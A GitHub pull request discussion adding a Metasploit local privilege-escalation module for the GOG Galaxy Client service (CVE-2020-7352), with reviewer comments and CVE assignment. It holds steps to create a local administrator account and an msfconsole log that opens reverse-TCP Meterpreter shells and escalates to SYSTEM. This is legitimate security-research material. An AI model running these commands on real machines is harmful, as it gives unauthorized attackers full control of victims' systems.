=== Content from github.com_4728e392_20250119_120903.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13444)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13444)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  37](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# GOG Galaxy Client Privilege Escalation Module #13444

 Merged

[space-r7](/space-r7)
merged 3 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[jtesta:gog\_galaxy\_privesc](/jtesta/metasploit-framework/tree/gog_galaxy_privesc "jtesta/metasploit-framework:gog_galaxy_privesc")

Jun 15, 2020

 Merged

# [GOG Galaxy Client Privilege Escalation Module](#top) #13444

[space-r7](/space-r7)
merged 3 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[jtesta:gog\_galaxy\_privesc](/jtesta/metasploit-framework/tree/gog_galaxy_privesc "jtesta/metasploit-framework:gog_galaxy_privesc")

Jun 15, 2020

[Conversation
18](/rapid7/metasploit-framework/pull/13444)
[Commits
3](/rapid7/metasploit-framework/pull/13444/commits)
[Checks
0](/rapid7/metasploit-framework/pull/13444/checks)
[Files changed](/rapid7/metasploit-framework/pull/13444/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![jtesta](https://avatars.githubusercontent.com/u/2982011?s=60&v=4)](/jtesta)

Copy link

Contributor

### @jtesta **[jtesta](/jtesta)** commented [May 13, 2020](#issue-617086429)

Tell us what this change does. If you're fixing a bug, please mention

the github issue number.

Please ensure you are submitting **from a unique branch** in your [repository](https://github.com/rapid7/metasploit-framework/pull/11086#issuecomment-445506416) to master in Rapid7's.

## Verification

List the steps needed to make sure this thing works

* Gain shell on Windows host with GOG Galaxy Client v2.0.12 or earlier.
* `run post/windows/escalate/gog_galaxyclientservice_privesc`
* Verify that a user named `newadmin` was created.
* Optionally, run again with ARGS="localgroup Administrators newadmin /add" to promote to local administrator.

Sorry, something went wrong.

All reactions

[![@jtesta](https://avatars.githubusercontent.com/u/2982011?s=40&v=4)](/jtesta)

`[Added post/windows/escalate/gog_galaxyclientservice_privesc.](/rapid7/metasploit-framework/pull/13444/commits/601f8d6aadb980a0baa3f691f5a0cd1dcb5114b1 "Added post/windows/escalate/gog_galaxyclientservice_privesc.")`

`[601f8d6](/rapid7/metasploit-framework/pull/13444/commits/601f8d6aadb980a0baa3f691f5a0cd1dcb5114b1)`

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=80&u=1fe0601f243e1627c6f738027d2e71b90dad989d&v=4)](/bcoles)

Copy link

Contributor

### **[bcoles](/bcoles)** commented [May 13, 2020](#issuecomment-627848345)

| This should probably be implemented as a `exploit/windows/local` module to retrieve a new session, rather than requiring the operator to manually specify commands. Local exploit modules permit the user to specify a `ARCH_CMD` payload with an arbitrary command if they wish. |
| --- |

 ‚ù§Ô∏è
2
 bwatters-r7 and smcintyre-r7 reacted with heart emoji

All reactions

* ‚ù§Ô∏è
  2 reactions

Sorry, something went wrong.

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)
[bwatters-r7](/bwatters-r7)
added
[module](/rapid7/metasploit-framework/labels/module)
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
[needs-linting](/rapid7/metasploit-framework/labels/needs-linting)
The module needs additional work to pass our automated linting rules
labels
[May 13, 2020](#event-3331917983)

[![@label-actions](https://avatars.githubusercontent.com/in/24092?s=80&v=4)](/apps/label-actions)

Copy link

### **[label-actions](/apps/label-actions) bot** commented [May 13, 2020](#issuecomment-627962867)

| Thanks for your pull request! Before this can be merged, we need the following documentation for your module:   * [Writing Module Documentation](https://github.com/rapid7/metasploit-framework/wiki/Writing-Module-Documentation) * [Template](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/module_doc_template.md) * [Examples](https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules) |
| --- |

All reactions

Sorry, something went wrong.

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)
[bwatters-r7](/bwatters-r7)
removed
the
[needs-linting](/rapid7/metasploit-framework/labels/needs-linting)
The module needs additional work to pass our automated linting rules
label
[May 13, 2020](#event-3331920287)

[![@rapid7](https://avatars.githubusercontent.com/u/1013671?s=40&v=4)](/rapid7)
[rapid7](/rapid7)
deleted a comment from
[label-actions](/apps/label-actions) bot
[May 13, 2020](#event-3331920928)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 13, 2020](#issuecomment-628031032)

| [@jtesta](https://github.com/jtesta) Hello Joe, have you gotten a CVE for this bug yet? If not [@todb-r7](https://github.com/todb-r7) might be able to assist. |
| --- |

 üëç
1
 ccondon-r7 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@jtesta](https://avatars.githubusercontent.com/u/2982011?s=80&u=0d4cc64924e30b8d1f7289264d2c9b642ad0ce96&v=4)](/jtesta)

Copy link

Contributor

Author

### **[jtesta](/jtesta)** commented [May 13, 2020](#issuecomment-628035075) via email

| Hi Grant. Nope, I haven't gotten a CVE yet. Aside from [@todb-r7](https://github.com/todb-r7), how would one go about reserving one nowadays? Many moons ago, I would contact Steve Christey from the CVE project directly... is that still a thing? ‚Ä¶ On 5/13/20 10:34 AM, Grant Willcox wrote: [@jtesta](https://github.com/jtesta) <<https://github.com/jtesta>> Hello Joe, have you gotten a CVE for this bug yet? If not [@todb-r7](https://github.com/todb-r7) <<https://github.com/todb-r7>> might be able to assist. ‚Äî You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub <[#13444 (comment)](https://github.com/rapid7/metasploit-framework/pull/13444#issuecomment-628031032)>, or unsubscribe <<https://github.com/notifications/unsubscribe-auth/AAWYA6YS5KLDFSHI5XBAS5DRRKVX7ANCNFSM4M7KY2QA>>.   -- Joseph S. Testa II Founder & Principal Security Consultant Positron Security |
| --- |

All reactions

Sorry, something went wrong.

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [May 13, 2020](#issuecomment-628052769) ‚Ä¢ edited Loading

| Hi Grant. Nope, I haven't gotten a CVE yet. Aside from [@todb-r7](https://github.com/todb-r7), how would one go about reserving one nowadays?  So, I'm probably the easiest path for Metasploit stuff like this, but you're welcome to do it yourself at the CVE Request form, here: <https://cveform.mitre.org/> (Doesn't look like GOG is a CNA).  Let me know if you want to do it yourself, or let me. I'm happy to assign one of R7's research CVEs to this (with you listed as the discoverer, of course).  As an aside, I saw in your writeup a screenshot of the private key you extracted from the binary. Would you mind contributing that to <https://github.com/rapid7/ssh-badkeys> ? That's basically the [naughty step](https://www.supernanny.co.uk/Advice/-/Parenting-Skills/-/Discipline-and-Reward/The-Naughty-Step-~-what-is-it-and-how-does-it-work.aspx) for misbehaving keys. |
| --- |

All reactions

Sorry, something went wrong.

[![@jtesta](https://avatars.githubusercontent.com/u/2982011?s=80&u=0d4cc64924e30b8d1f7289264d2c9b642ad0ce96&v=4)](/jtesta)

Copy link

Contributor

Author

### **[jtesta](/jtesta)** commented [May 13, 2020](#issuecomment-628060111) via email

| Sure, you can make the CVE. And thanks for the info... next time I'll reserve it myself to make things easier. Regarding the private key extracted from the binary: its only used for generating HMAC-512 tags, not for SSH. Would it still be appropriate to submit it to the ssh-badkeys repo in that case? ‚Ä¶ On 5/13/20 11:05 AM, Tod Beardsley wrote: Hi Grant. Nope, I haven't gotten a CVE yet. Aside from [@todb-r7](https://github.com/todb-r7) <<https://github.com/todb-r7>>, how would one go about reserving one nowadays? So, I'm probably the easiest path for Metasploit stuff like this, but you're welcome to do it yourself at the CVE Request form, here: <https://cveform.mitre.org/> (Doesn't look like GOG is a CNA). Let me know if you want to do it yourself, or let me. I'm happy to assign one of R7's research CVEs to this (with you listed as the discoverer, of course). As an aside, I saw in your writeup a screenshot of the private key you extracted from the binary. Would you mind contributing that to <https://github.com/rapid7/ssh-badkeys> ? That's basically the naughty step for misbehaving keys. ‚Äî You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub <[#13444 (comment)](https://github.com/rapid7/metasploit-framework/pull/13444#issuecomment-628052769)>, or unsubscribe <<https://github.com/notifications/unsubscribe-auth/AAWYA63FUQ2XKPPGTZ32BDLRRKZNBANCNFSM4M7KY2QA>>.   -- Joseph S. Testa II Founder & Principal Security Consultant Positron Security |
| --- |

All reactions

Sorry, something went wrong.

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [May 13, 2020](#issuecomment-628203526)

| Would it still be appropriate to submit it to the ssh-badkeys repo in that case?  Oh maybe <https://github.com/BenBE/kompromat> is more appropriate for this. If you like.  Editing now to include the CVE! |
| --- |

All reactions

Sorry, something went wrong.

`[Add](/rapid7/metasploit-framework/pull/13444/commits/00579b498f9d253e2e4e1cc1f24ecac413411ad8 "Add CVE-2020-7352 to the references

Freshly reserved! Not populated yet!") [CVE-2020-7352](https://github.com/advisories/GHSA-chcw-6743-7jr7 "CVE-2020-7352") [to the references](/rapid7/metasploit-framework/pull/13444/commits/00579b498f9d253e2e4e1cc1f24ecac413411ad8 "Add CVE-2020-7352 to the references

Freshly reserved! Not populated yet!")`
 ‚Ä¶

`[00579b4](/rapid7/metasploit-framework/pull/13444/commits/00579b498f9d253e2e4e1cc1f24ecac413411ad8)`

```
Freshly reserved! Not populated yet!
```

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [May 13, 2020](#issuecomment-628216166)

| [@jtesta](https://github.com/jtesta) I'm just a fan of over-sharing compromised keys, just in case they show up somewhere else. Distributed private keys should be double-tap killed. |
| --- |

All reactions

Sorry, something went wrong.

[![@jtesta](https://avatars.githubusercontent.com/u/2982011?s=40&v=4)](/jtesta)

`[Moved module into exploit/windows/local. Added documentation.](/rapid7/metasploit-framework/pull/13444/commits/5508bda29e800f64d02b6587fd364dc43dacbaf2 "Moved module into exploit/windows/local.  Added documentation.")`

`[5508bda](/rapid7/metasploit-framework/pull/13444/commits/5508bda29e800f64d02b6587fd364dc43dacbaf2)`

[![@jtesta](https://avatars.githubusercontent.com/u/2982011?s=80&u=0d4cc64924e30b8d1f7289264d2c9b642ad0ce96&v=4)](/jtesta)

Copy link

Contributor

Author

### **[jtesta](/jtesta)** commented [May 18, 2020](#issuecomment-630439917)

| As [@bcoles](https://github.com/bcoles) suggested, I moved the module into `exploit/windows/local`.  Documentation has been added as well.  Does this PR need anything else? |
| --- |

All reactions

Sorry, something went wrong.

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=40&u=1fe0601f243e1627c6f738027d2e71b90dad989d&v=4)](/bcoles)
[bcoles](/bcoles)
added
[docs](/rapid7/metasploit-framework/labels/docs)
and removed
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
labels
[May 19, 2020](#event-3351447323)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 19, 2020](#issuecomment-630809622)

| [@jtesta](https://github.com/jtesta) Your documentation needs proper instructions on where to get the vulnerable versions as well as how to set them up. Also your section `## Scenarios` should also list which version and system you tested this on.  You can refer to [@h00die](https://github.com/h00die)'s PR at <https://github.com/rapid7/metasploit-framework/pull/13470/files> for an example of how this should be formatted. Note the installation steps he provides, as well as the additional `### Pi-Hole 4.3 with AdminLTE 4.3 on Ubuntu 18.04` section he has under `## Scenarios`. In your case you would need to make this something like `### GOG Galaxy version 1.2.64.2 on Windows 10 1909 x64`.  For your installer steps I took the liberty of finding some appropriate downloads from GOG Galaxy's official servers. They are:  <https://cdn.gog.com/open/galaxy/client/setup_galaxy_1.2.64.2.exe> <https://cdn.gog.com/open/galaxy/client/setup_galaxy_2.0.12.48.exe>  Given that the version number is a 4 part number, not a 3 part number, I would recommend updating your documentation to be more specific as to the versions affected. For example I couldn't find 1.2.64.0, nor could I find 1.2.64.1, so this is something that maybe should be considered in your explanation, whereby you could just say something like `versions 1.2.64.x and prior were affected`.  Otherwise looks good from an initial glance through, but will need to dive into this one deeper to check for additional issues. |
| --- |

 üëç
1
 h00die reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=80&u=1fe0601f243e1627c6f738027d2e71b90dad989d&v=4)](/bcoles)

Copy link

Contributor

### **[bcoles](/bcoles)** commented [May 19, 2020](#issuecomment-630819200)

| Does this PR need anything else?  Please update the module to use Metasploit payloads rather than commands specified in module options. This will also require specifying the appropriate `arch` and `platform` in the module `info` Hash.  Optionally, you can also add a second `target` with `ARCH_CMD` for using Windows command payloads, such as powershell commands. Although there's no existing Windows local exploits which do this, there's plenty of other examples from which you can steal code, such as [freeswitch\_event\_socket\_cmd\_exec](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/freeswitch_event_socket_cmd_exec.rb), which offers multiple `targets`. |
| --- |

All reactions

Sorry, something went wrong.

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)
[space-r7](/space-r7)
self-assigned this
[Jun 8, 2020](#event-3421529830)

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=80&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)

Copy link

Contributor

### **[space-r7](/space-r7)** commented [Jun 8, 2020](#issuecomment-640850381)

| Hi [@jtesta](https://github.com/jtesta), I really enjoyed your writeup on this vulnerability! Just installed the client on a Windows machine, tested out your module, and it works great. As for making the suggested changes, will you have any bandwidth anytime soon? If not, I'd be happy to assist and get your module across the finish line. Thanks! |
| --- |

All reactions

Sorry, something went wrong.

[![@jtesta](https://avatars.githubusercontent.com/u/2982011?s=80&u=0d4cc64924e30b8d1f7289264d2c9b642ad0ce96&v=4)](/jtesta)

Copy link

Contributor

Author

### **[jtesta](/jtesta)** commented [Jun 9, 2020](#issuecomment-641559193)

| [@space-r7](https://github.com/space-r7) Glad you enjoyed the write-up!  Unfortunately, I'm busy at the moment, but if you were able to help brush this up for merging, that would be great! |
| --- |

All reactions

Sorry, something went wrong.

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=80&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)

Copy link

Contributor

### **[space-r7](/space-r7)** commented [Jun 10, 2020](#issuecomment-642016504)

| [@space-r7](https://github.com/space-r7) Glad you enjoyed the write-up!  Unfortunately, I'm busy at the moment, but if you were able to help brush this up for merging, that would be great!  Can do! Thanks so much! |
| --- |

All reactions

Sorry, something went wrong.

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=80&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)

Copy link

Contributor

### **[space-r7](/space-r7)** commented [Jun 15, 2020](#issuecomment-644148637)

| Didn't have much luck with adding an `ARCH_CMD` target, so the module only uses the dropper method. Tested on Galaxy Client `v1.2.66.64`:  ``` msf5 > use multi/handler msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.37.1 lhost => 192.168.37.1 msf5 exploit(multi/handler) > run  [*] Started reverse TCP handler on 192.168.37.1:4444  [*] Sending stage (201283 bytes) to 192.168.37.131 [*] Meterpreter session 1 opened (192.168.37.1:4444 -> 192.168.37.131:50855) at 2020-06-15 08:35:15 -0500  meterpreter > getuid Server username: DESKTOP-AQT4EG1\space meterpreter > sysinfo Computer        : DESKTOP-AQT4EG1 OS              : Windows 10 (10.0 Build 18362). Architecture    : x64 System Language : en_US Domain          : WORKGROUP Logged On Users : 15 Meterpreter     : x64/windows meterpreter > background [*] Backgrounding session 1... msf5 exploit(multi/handler) > use exploit/windows/local/gog_galaxyclientservice_privesc  msf5 exploit(windows/local/gog_galaxyclientservice_privesc) > set session 1 session => 1 msf5 exploit(windows/local/gog_galaxyclientservice_privesc) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf5 exploit(windows/local/gog_galaxyclientservice_privesc) > set lhost 192.168.37.1 lhost => 192.168.37.1 msf5 exploit(windows/local/gog_galaxyclientservice_privesc) > check [*] The target appears to be vulnerable. Vulnerable version found: 1.2.66.64 msf5 exploit(windows/local/gog_galaxyclientservice_privesc) > run  [*] Started reverse TCP handler on 192.168.37.1:4444  [*] Starting GalaxyClientService... [*] Service started successfully. [*] Connecting to service... [*] Writing C:\Users\space\AppData\Local\Temp\mqslPXvWyu.exe to target [*] Connected to service.  Sending payload... [*] Sending stage (201283 bytes) to 192.168.37.131 [*] Meterpreter session 2 opened (192.168.37.1:4444 -> 192.168.37.131:50857) at 2020-06-15 08:35:59 -0500 [+] Command executed successfully!  meterpreter > getuid Server username: NT AUTHORITY\SYSTEM meterpreter > sysinfo Computer        : DESKTOP-AQT4EG1 OS              : Windows 10 (10.0 Build 18362). Architecture    : x64 System Language : en_US Domain          : WORKGROUP Logged On Users : 15 Meterpreter     : x64/windows  ``` |
| --- |

All reactions

Sorry, something went wrong.

[space-r7](/space-r7)
added a commit
that referenced
this pull request
[Jun 15, 2020](#ref-commit-1cb57a7)
[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)

`[Land](/rapid7/metasploit-framework/commit/1cb57a7e79affb4c4dc48f03a2fd39659bb83bbb "Land #13444, add GOG Galaxy Client Privesc") [#13444](https://github.com/rapid7/metasploit-framework/pull/13444)[, add GOG Galaxy Client Privesc](/rapid7/metasploit-framework/commit/1cb57a7e79affb4c4dc48f03a2fd39659bb83bbb "Land #13444, add GOG Galaxy Client Privesc")`

`[1cb57a7](/rapid7/metasploit-framework/commit/1cb57a7e79affb4c4dc48f03a2fd39659bb83bbb)`

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)
[space-r7](/space-r7)
merged commit [`5508bda`](/rapid7/metasploit-framework/commit/5508bda29e800f64d02b6587fd364dc43dacbaf2)
into
rapid7:master

[Jun 15, 2020](https://github.com/rapid7/metasploit-framework/pull/13444#event-3444521133)

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=80&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)

Copy link

Contributor

### **[space-r7](/space-r7)** commented [Jun 15, 2020](#issuecomment-644153785) ‚Ä¢ edited by tperry-r7 Loading

| Release Notes The GOG GalaxyClientService Privilege Escalation module that targets vulnerable versions of the gaming software known as GOG Galaxy Client. The `GalaxyClientService` runs as system and listens locally on port 9978 for commands. A user can connect to this service and issue commands to run, allowing for escalation to SYSTEM. |
| --- |

All reactions

Sorry, something went wrong.

[![@jtesta](https://avatars.githubusercontent.com/u/2982011?s=80&u=0d4cc64924e30b8d1f7289264d2c9b642ad0ce96&v=4)](/jtesta)

Copy link

Contributor

Author

### **[jtesta](/jtesta)** commented [Jun 15, 2020](#issuecomment-644390847)

| [@space-r7](https://github.com/space-r7) Thank you so much for taking the lead on this and getting it merged! |
| --- |

All reactions

Sorry, something went wrong.

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=80&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)

Copy link

Contributor

### **[space-r7](/space-r7)** commented [Jun 15, 2020](#issuecomment-644398505)

| [@space-r7](https://github.com/space-r7) Thank you so much for taking the lead on this and getting it merged!  No problem! Thank you for the module! |
| --- |

All reactions

Sorry, something went wrong.

[![@adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=40&v=4)](/adfoster-r7)
[adfoster-r7](/adfoster-r7)
added
the
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
label
[Jun 19, 2020](#event-3462550325)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13444)

Reviewers

No reviews

Assignees

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&v=4)](/space-r7) [space-r7](/space-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

7 participants

[![@jtesta](https://avatars.githubusercontent.com/u/2982011?s=52&v=4)](/jtesta) [![@bcoles](https://avatars.githubusercontent.com/u/434827?s=52&v=4)](/bcoles) [![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=52&v=4)](/gwillcox-r7) [![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=52&v=4)](/todb-r7) [![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=52&v=4)](/space-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=52&v=4)](/bwatters-r7) [![@adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=52&v=4)](/adfoster-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_e8812612_20250119_135129.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-chcw-6743-7jr7)

**CVE-2020-7352**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
